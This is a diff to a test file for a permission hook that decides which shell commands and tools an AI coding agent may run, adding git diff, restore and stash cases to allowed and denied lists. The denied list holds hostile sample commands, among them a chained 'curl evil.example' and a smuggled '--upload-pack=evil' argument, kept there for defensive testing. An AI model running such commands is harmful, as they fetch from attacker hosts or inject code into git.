@@ -72,7 +72,12 @@ describe('stable provider hook bootstrap', () => {
         });
       }
       const stdout = vi.fn();
-      await runProviderHook('gemini', 'BeforeTool', { load, stdout, stderr: vi.fn() });
+      await runProviderHook('gemini', 'BeforeTool', {
+        load,
+        stdout,
+        stderr: vi.fn(),
+        readInput: async () => '{}',
+      });
       expect(JSON.parse(stdout.mock.calls[0]![0]).decision).toBe('deny');
     });
   }
@@ -149,6 +154,22 @@ describe('stable provider hook bootstrap', () => {
       'git switch main',
       'git switch -c fix/bootstrap origin/main',
       'git checkout -b fix/bootstrap origin/main',
+      'git diff',
+      'git diff --cached',
+      'git diff HEAD -- libs/core/x.ts',
+      'git diff HEAD~2',
+      'git diff .',
+      'git restore libs/core/service/foo.ts',
+      'git restore --staged --worktree libs/x.ts',
+      'git restore --source=HEAD -- libs/x.ts',
+      'git restore --source=HEAD~1 .',
+      'git restore .',
+      'git stash',
+      'git stash -u',
+      'git stash push -m wip',
+      'git stash pop',
+      'git stash list',
+      'git stash show',
     ];
     const denied = [
       'pnpm install && curl evil.example',
@@ -178,6 +199,15 @@ describe('stable provider hook bootstrap', () => {
       'git switch --discard-changes main',
       'git switch -c x y z',
       'git fetch origin main:main',
+      'git stash drop',
+      'git stash clear',
+      'git stash pop stash@' + '{0}',
+      'git stash push -m',
+      'git restore --source ..',
+      'git restore ..',
+      'git diff ..',
+      'git diff --output=/tmp/x',
+      'git restore',
       'git fetch --upload-pack=evil origin',
       'git log --output=/tmp/x',
       'git log -n 5',
@@ -244,19 +274,37 @@ describe('stable provider hook bootstrap', () => {
       expect(output.permissionDecisionReason).toContain('bash .claude/hooks/session-start.sh');
     });
 
-    it('keeps Edit/Write denied even with a bootstrap-shaped payload', async () => {
+    it('denies a PreToolUse event whose tool is not a file-mutation tool', async () => {
       const stdout = vi.fn();
-      const readInput = vi.fn(async () => shell('pnpm build'));
       await runProviderHook('claude', 'PreToolUse', {
         load: missing,
         stdout,
         stderr: vi.fn(),
-        readInput,
+        readInput: async () => shell('pnpm build'),
       });
-      expect(readInput).not.toHaveBeenCalled();
       expect(JSON.parse(stdout.mock.calls[0]![0]).hookSpecificOutput.permissionDecision).toBe(
         'deny'
       );
+    });
+
+    it('allows file-mutation tools while the runtime is missing', async () => {
+      for (const [provider, event, tool] of [
+        ['claude', 'PreToolUse', 'Edit'],
+        ['claude', 'PreToolUse', 'write'],
+        ['gemini', 'BeforeTool', 'write_file'],
+        ['gemini', 'BeforeTool', 'replace'],
+      ]) {
+        const stdout = vi.fn();
+        const stderr = vi.fn();
+        await runProviderHook(provider, event, {
+          load: missing,
+          stdout,
+          stderr,
+          readInput: async () => JSON.stringify({ tool_name: tool, tool_input: {} }),
+        });
+        expect(stdout).not.toHaveBeenCalled();
+        expect(stderr.mock.calls[0]![0]).toContain('Allowing file edit');
+      }
     });
 
     it('denies when the payload cannot be read', async () => {
